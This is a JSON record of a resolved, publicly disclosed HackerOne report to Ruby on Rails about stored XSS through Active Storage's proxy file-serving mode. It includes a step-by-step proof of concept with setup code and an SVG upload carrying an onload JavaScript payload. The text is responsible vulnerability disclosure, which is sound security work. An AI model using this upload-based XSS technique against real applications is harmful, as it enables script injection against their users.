{"id":949513,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDk1MTM=","url":"https://hackerone.com/reports/949513","title":"XSS by file (Active Storage `Proxying`)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-08-02T05:13:31.181Z","submitted_at":"2020-08-02T05:13:31.245Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-09-01T22:51:37.236Z","bug_reporter_agreed_on_going_public_at":"2020-09-01T22:51:37.182Z","team_member_agreed_on_going_public_at":"2020-09-01T19:14:06.796Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\nI've seen similar issues with #407319 and #429868 occur with Active Storage's new File serving strategies `Proxying`.\n\nCommit is https://github.com/rails/rails/commit/dfb5a82b259e134eac89784ac4ace0c44d1b4aee.\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/concerns/active_storage/set_headers.rb#L9\n      response.headers[\"Content-Disposition\"] = ActionDispatch::Http::ContentDisposition.format \\\n        disposition: params[:disposition] || \"inline\", filename: blob.filename.\n```\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb\n\n# Proxy files through application. This avoids having a redirect and makes files easier to cache.\nclass ActiveStorage::Blobs::ProxyController \u003c ActiveStorage::BaseController\n  include ActiveStorage::SetBlob\n  include ActiveStorage::SetHeaders\n\n  def show\n    http_cache_forever public: true do\n      set_content_headers_from @blob\n      stream @blob\n    end\n  end\nend  \n```\n\nSince `inline` can be set regardless of the file type, XSS is possible when a malicious file is uploaded.\n\n### Proof of concept\n\n#### 1. Preparing the server\n\n```\n$ rails new proxy_xss --skip-bundle --skip-webpack-install\n$ cd proxy_xss/\n```\n\nEdit Gemfile.\n\n```ruby\nsource 'https://rubygems.org'\ngit_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\n\nruby '2.7.1'\n\ngem 'rails', github: \"rails/rails\", branch: \"master\"\ngem 'sqlite3', '~\u003e 1.4'\ngem 'puma', '~\u003e 4.1'\n\ngem 'bootsnap', '\u003e= 1.4.2', require: false\n\ngroup :development do\n  gem 'listen', '~\u003e 3.2'\nend\n```\n\n```\n$ bundle install\n...\n\n$ head Gemfile.lock\nGIT\n  remote: https://github.com/rails/rails.git\n  revision: 11f54e12b992f6c8d29fd9bedd89ac438a928a2f\n  branch: master\n  specs:\n    actioncable (6.1.0.alpha)\n      actionpack (= 6.1.0.alpha)\n      activesupport (= 6.1.0.alpha)\n      nio4r (~\u003e 2.0)\n      websocket-driver (\u003e= 0.6.1)\n```\n\n```\n$ bundle exec rails active_storage:install\n$ bundle exec rails g resource user name:text\n$ bundle exec rails db:migrate\n```\n\nEdit app files.\n\n```ruby\n# controllers/users_controller.rb\nclass UsersController \u003c ApplicationController\n\n  def new\n    @user = User.new\n  end\n\n  def create\n    user = User.create!(user_params)\n    redirect_to \"/users/#{user.id}\"\n  end\n\n  def show\n    @user = User.find(params[:id])\n  end\n\n  private\n    def user_params\n      params.require(:user).permit(:name, :image)\n    end\nend\n```\n\n```ruby\n# models/user.rb\nclass User \u003c ApplicationRecord\n  has_one_attached :image\nend\n```\n\n```erb\n# views/layouts/application.html.erb\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n  \u003chead\u003e\n    \u003ctitle\u003eProxyXss\u003c/title\u003e\n    \u003c%= csrf_meta_tags %\u003e\n    \u003c%= csp_meta_tag %\u003e\n  \u003c/head\u003e\n\n  \u003cbody\u003e\n    \u003c%= yield %\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n```erb\n# views/user/new.html.erb\n\u003c%= form_with model: @user, local: true, :url =\u003e {:action =\u003e :create}  do |form| %\u003e\n  \u003c%= form.text_area :name %\u003e\u003cbr\u003e\n  \u003c%= form.file_field :image %\u003e\u003cbr\u003e\n  \u003c%= form.submit %\u003e\n\u003c% end %\u003e\n```\n\n```erb\n# views/user/show.html.erb\n\u003c% if @user.image.attached? %\u003e\n  \u003c%= image_tag @user.image %\u003e\n\u003c% end %\u003e\n```\n\n#### 2. Obtain url\n\nStart server.\n\n```\nrails s\n```\n\nOpen `http://localhost:3000/users/new` in your browser, Upload the following file as `alert.svg`.\n\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003csvg xmlns='http://www.w3.org/2000/svg' width=\"200px\" height=\"200px\" onload=\"javascript:alert(location)\"\u003e\n\u003c/svg\u003e\n```\n\nAfter that, use the developer tool to obtain the redirected URL.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n#### 3. XSS\n\nRewrite `redirect` in URL to `proxy` and alert will appear when opening URL directly in browser.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n{F933309}\n\n## Impact\n\nXSS is possible if attacker can upload files using Active storage.\nThis commit has not been released yet, so it only affects services using Rails on the master branch.\n(Maybe `Hey` etc. https://gist.github.com/dhh/782fb925b57450da28c1e15656779556#file-gemfile-L3)\n\nIn addition, since the csp header is not output for the svg file (https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/http/content_security_policy.rb#L20), it can be avoided even if csp is set.","vulnerability_information_html":"\u003cp\u003eHello,\u003cbr\u003e\nI\u0026#39;ve seen similar issues with \u003ca href=\"/reports/407319\"\u003e#407319\u003c/a\u003e and \u003ca href=\"/reports/429868\"\u003e#429868\u003c/a\u003e occur with Active Storage\u0026#39;s new File serving strategies \u003ccode\u003eProxying\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eCommit is \u003ca title=\"https://github.com/rails/rails/commit/dfb5a82b259e134eac89784ac4ace0c44d1b4aee\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fcommit%2Fdfb5a82b259e134eac89784ac4ace0c44d1b4aee\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/commit/dfb5a82b259e134eac89784ac4ace0c44d1b4aee\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# https://github.com/rails/rails/blob/master/activestorage/app/controllers/concerns/active_storage/set_headers.rb#L9\u003c/span\u003e\n      \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Content-Disposition\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eActionDispatch\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHttp\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eContentDisposition\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eformat\u003c/span\u003e \u003cspan class=\"p\"\u003e\\\u003c/span\u003e\n        \u003cspan class=\"ss\"\u003edisposition: \u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:disposition\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;inline\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003efilename: \u003c/span\u003e\u003cspan class=\"n\"\u003eblob\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003efilename\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# https://github.com/rails/rails/blob/master/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Proxy files through application. This avoids having a redirect and makes files easier to cache.\u003c/span\u003e\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eActiveStorage\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eBlobs\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eProxyController\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"no\"\u003eActiveStorage\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eBaseController\u003c/span\u003e\n  \u003cspan class=\"kp\"\u003einclude\u003c/span\u003e \u003cspan class=\"no\"\u003eActiveStorage\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eSetBlob\u003c/span\u003e\n  \u003cspan class=\"kp\"\u003einclude\u003c/span\u003e \u003cspan class=\"no\"\u003eActiveStorage\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eSetHeaders\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eshow\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ehttp_cache_forever\u003c/span\u003e \u003cspan class=\"ss\"\u003epublic: \u003c/span\u003e\u003cspan class=\"kp\"\u003etrue\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n      \u003cspan class=\"n\"\u003eset_content_headers_from\u003c/span\u003e \u003cspan class=\"vi\"\u003e@blob\u003c/span\u003e\n      \u003cspan class=\"n\"\u003estream\u003c/span\u003e \u003cspan class=\"vi\"\u003e@blob\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e  \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince \u003ccode\u003einline\u003c/code\u003e can be set regardless of the file type, XSS is possible when a malicious file is uploaded.\u003c/p\u003e\n\n\u003ch3 id=\"proof-of-concept\"\u003eProof of concept\u003c/h3\u003e\n\n\u003ch4 id=\"1-preparing-the-server\"\u003e1. Preparing the server\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ rails new proxy_xss --skip-bundle --skip-webpack-install\n$ cd proxy_xss/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEdit Gemfile.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003esource\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;https://rubygems.org\u0026#39;\u003c/span\u003e\n\u003cspan class=\"n\"\u003egit_source\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:github\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003erepo\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;https://github.com/\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003erepo\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.git\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eruby\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;2.7.1\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003egem\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rails\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003egithub: \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;rails/rails\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003ebranch: \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;master\u0026quot;\u003c/span\u003e\n\u003cspan class=\"n\"\u003egem\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;sqlite3\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;~\u0026gt; 1.4\u0026#39;\u003c/span\u003e\n\u003cspan class=\"n\"\u003egem\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;puma\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;~\u0026gt; 4.1\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003egem\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;bootsnap\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026gt;= 1.4.2\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003erequire: \u003c/span\u003e\u003cspan class=\"kp\"\u003efalse\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003egroup\u003c/span\u003e \u003cspan class=\"ss\"\u003e:development\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n  \u003cspan class=\"n\"\u003egem\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;listen\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;~\u0026gt; 3.2\u0026#39;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ bundle install\n...\n\n$ head Gemfile.lock\nGIT\n  remote: https://github.com/rails/rails.git\n  revision: 11f54e12b992f6c8d29fd9bedd89ac438a928a2f\n  branch: master\n  specs:\n    actioncable (6.1.0.alpha)\n      actionpack (= 6.1.0.alpha)\n      activesupport (= 6.1.0.alpha)\n      nio4r (~\u0026gt; 2.0)\n      websocket-driver (\u0026gt;= 0.6.1)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ bundle exec rails active_storage:install\n$ bundle exec rails g resource user name:text\n$ bundle exec rails db:migrate\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEdit app files.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# controllers/users_controller.rb\u003c/span\u003e\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eUsersController\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"no\"\u003eApplicationController\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003enew\u003c/span\u003e\n    \u003cspan class=\"vi\"\u003e@user\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ecreate\u003c/span\u003e\n    \u003cspan class=\"n\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ecreate!\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euser_params\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eredirect_to\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/users/\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eid\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eshow\u003c/span\u003e\n    \u003cspan class=\"vi\"\u003e@user\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003efind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:id\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n  \u003cspan class=\"kp\"\u003eprivate\u003c/span\u003e\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003euser_params\u003c/span\u003e\n      \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:user\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003epermit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003e:image\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# models/user.rb\u003c/span\u003e\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eUser\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"no\"\u003eApplicationRecord\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ehas_one_attached\u003c/span\u003e \u003cspan class=\"ss\"\u003e:image\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight erb\"\u003e\u003ccode\u003e# views/layouts/application.html.erb\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eProxyXss\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"n\"\u003ecsrf_meta_tags\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"n\"\u003ecsp_meta_tag\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"k\"\u003eyield\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight erb\"\u003e\u003ccode\u003e# views/user/new.html.erb\n\u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"n\"\u003eform_with\u003c/span\u003e \u003cspan class=\"ss\"\u003emodel: \u003c/span\u003e\u003cspan class=\"vi\"\u003e@user\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003elocal: \u003c/span\u003e\u003cspan class=\"kp\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003e:url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"ss\"\u003e:action\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"ss\"\u003e:create\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e  \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003eform\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"n\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003etext_area\u003c/span\u003e \u003cspan class=\"ss\"\u003e:name\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;br\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"n\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003efile_field\u003c/span\u003e \u003cspan class=\"ss\"\u003e:image\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;br\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"n\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003esubmit\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;%\u003c/span\u003e \u003cspan class=\"k\"\u003eend\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight erb\"\u003e\u003ccode\u003e# views/user/show.html.erb\n\u003cspan class=\"cp\"\u003e\u0026lt;%\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"vi\"\u003e@user\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eattached?\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"cp\"\u003e\u0026lt;%=\u003c/span\u003e \u003cspan class=\"n\"\u003eimage_tag\u003c/span\u003e \u003cspan class=\"vi\"\u003e@user\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eimage\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;%\u003c/span\u003e \u003cspan class=\"k\"\u003eend\u003c/span\u003e \u003cspan class=\"cp\"\u003e%\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"2-obtain-url\"\u003e2. Obtain url\u003c/h4\u003e\n\n\u003cp\u003eStart server.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003erails s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOpen \u003ccode\u003ehttp://localhost:3000/users/new\u003c/code\u003e in your browser, Upload the following file as \u003ccode\u003ealert.svg\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;http://www.w3.org/2000/svg\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200px\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200px\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonload=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;javascript:alert(location)\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter that, use the developer tool to obtain the redirected 